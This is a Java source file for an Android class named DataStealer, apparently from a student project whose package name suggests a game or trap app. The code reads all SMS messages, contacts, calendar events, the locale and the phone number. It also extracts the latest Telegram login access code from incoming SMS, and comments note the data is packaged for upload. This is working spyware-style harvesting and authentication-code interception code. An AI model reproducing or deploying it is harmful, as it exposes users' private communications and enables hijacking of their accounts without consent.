package de.hpi3d.gamepgrog.trap.android;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.database.Cursor;
import android.provider.CalendarContract;
import android.provider.ContactsContract;
import android.provider.ContactsContract.Profile;
import android.provider.Telephony;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.annotation.RequiresPermission;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

import de.hpi3d.gamepgrog.trap.datatypes.CalendarEvent;
import de.hpi3d.gamepgrog.trap.datatypes.Contact;
import de.hpi3d.gamepgrog.trap.datatypes.Language;
import de.hpi3d.gamepgrog.trap.datatypes.TextMessage;
import de.hpi3d.gamepgrog.trap.future.ArrayExt;


/**
 * Responsible for taking message, contact, and language data from
 * android storage. Also responsible for Telegram access code stealage
 */
public class DataStealer {

    /**
     * Returns a list of all text messages the user has sent or received.
     *
     * @param context to access storage
     * @return ArrayList of users text messages
     */
    public static ArrayList<TextMessage> takeMessageData(Context context) {
        String[] projection = new String[]{
                Telephony.Sms._ID,
                Telephony.Sms.ADDRESS,
                Telephony.Sms.DATE_SENT,
                Telephony.Sms.BODY,
                Telephony.Sms.TYPE,
        };

        Cursor cursor = context.getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                projection,
                null,
                null,
                null);

        ArrayList<TextMessage> textMessages = new ArrayList<>();

        if (null != cursor && cursor.moveToFirst()) {
            int positionOfIdColumn = cursor.getColumnIndex(Telephony.Sms._ID);
            int positionOfAddressColumn = cursor.getColumnIndex(Telephony.Sms.ADDRESS);
            int positionOfDateSentColumn = cursor.getColumnIndex(Telephony.Sms.DATE_SENT);
            int positionOfBodyColumn = cursor.getColumnIndex(Telephony.Sms.BODY);
            int positionOfMessageTypeColumn = cursor.getColumnIndex(Telephony.Sms.TYPE);

            do {
                long id = cursor.getLong(positionOfIdColumn);
                String address = cursor.getString(positionOfAddressColumn);
                long dateSent = cursor.getLong(positionOfDateSentColumn) / 1000;
                String body = cursor.getString(positionOfBodyColumn);
                int typeFlag = cursor.getInt(positionOfMessageTypeColumn);

                boolean inbound = typeFlag == Telephony.Sms.MESSAGE_TYPE_INBOX;

                TextMessage textMessage = new TextMessage(id, dateSent, body, address, inbound);
                textMessages.add(textMessage);

            } while (cursor.moveToNext());
            cursor.close();
        }

        return textMessages;
    }

    /**
     * Reads out data from contacts on the device and returns them.
     * Currently only reads names of contacts.
     * If you need to access data beyond just contact names look at the Contact.enrich method.
     * <p>
     * For additional info regarding the used ApiBuilder see
     * https://developer.android.com/guide/topics/providers/contacts-provider.html
     *
     * @param context to access contentResolver
     * @return ArrayList of Contacts
     */
    public static ArrayList<Contact> takeContactData(Context context) {
        // Sets the columns to retrieve for the user profile
        String[] projection = new String[]{
                Profile._ID,
                Profile.DISPLAY_NAME_PRIMARY,
                Profile.LOOKUP_KEY,
                Profile.PHOTO_THUMBNAIL_URI
        };

        // Retrieves the profile from the Contacts Provider
        Cursor cursor = context.getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI,
                projection,
                null,
                null,
                null);

        ArrayList<Contact> extractedContacts = new ArrayList<>();
        if (null != cursor && cursor.moveToFirst()) {
            int positionOfNameColumn = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
            int positionOfIdColumn = cursor.getColumnIndex(ContactsContract.Contacts._ID);

            do {
                String contactName = cursor.getString(positionOfNameColumn);
                long id = cursor.getLong(positionOfIdColumn);
                Contact contact = new Contact(id, contactName);
                Log.d("NEW CONTACT CREATED", contact.toString());
                extractedContacts.add(contact);
            } while (cursor.moveToNext());
            cursor.close();
        }

        extractedContacts = Contact.enrich(extractedContacts, context);

        return extractedContacts;
    }

    /**
     * Returns default locale of the user.
     * Returned as ArrayList to ease upload.
     *
     * @return users locale
     */
    public static ArrayList<Language> takeLanguage() {
        ArrayList<Language> languageList = new ArrayList<>();
        languageList.add(Language.getCurrentLanguage());
        return languageList;

    }

    /**
     * Finds the latest message sent to the user by the Telegram contact, and extracts the
     * access code contained within it.
     *
     * @param context to access storage
     * @return latest received access code
     */
    public static String takeTelegramAccessCode(Context context) {
        List<TextMessage> messages = takeMessageData(context);
        if (messages.size() > 0) {
            List<TextMessage> messagesByTelegram = ArrayExt.filter(messages,
                    (message) -> message.getAddress().equals("Telegram"));
            Collections.sort(messagesByTelegram);
            TextMessage telegramMessage = messagesByTelegram.get(messagesByTelegram.size() - 1);
            String[] words = telegramMessage.getBody().split(" ");
            return words[words.length - 1];
        }
        return "";
    }

    /**
     * Returns all events the user has in their calendar. Depending on the users calendar, and
     * how often they migrate phones, these these might be all the user has ever put into a calendar.
     *
     * @param context to access storage
     * @return ArrayList of all calendar entries.
     * @throws SecurityException if no calendar permission is granted
     */
    public static ArrayList<CalendarEvent> takeCalendarData(Context context) throws SecurityException {

        String[] projection = new String[]{
                CalendarContract.Events._ID,
                CalendarContract.Events.TITLE,
                CalendarContract.Events.EVENT_LOCATION,
                CalendarContract.Events.DTSTART,
                CalendarContract.Events.DTEND
        };

        Cursor cursor = context.getContentResolver().query(
                CalendarContract.Events.CONTENT_URI,
                projection,
                null,
                null,
                null);

        return CalendarEvent.createFromCursor(cursor);
    }

    /**
     * Returns users phone number.
     * <p>
     * Ideally, at least. SIM-Card vendors have locked this down a lot in recent years,
     * and on some devices this won't work.
     *
     * @param context to access storage
     * @return users phone number
     */
    @SuppressLint("HardwareIds")
    @RequiresPermission(Manifest.permission.READ_PHONE_STATE)
    public static String getUserPhoneNumber(Context context) {
        TelephonyManager tel = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        if (tel != null) {
            String number = tel.getLine1Number();
            if (number.startsWith("0")) {
                number = "+49" + number.substring(1);
            }
            return number;
        }
        return "";
    }
}
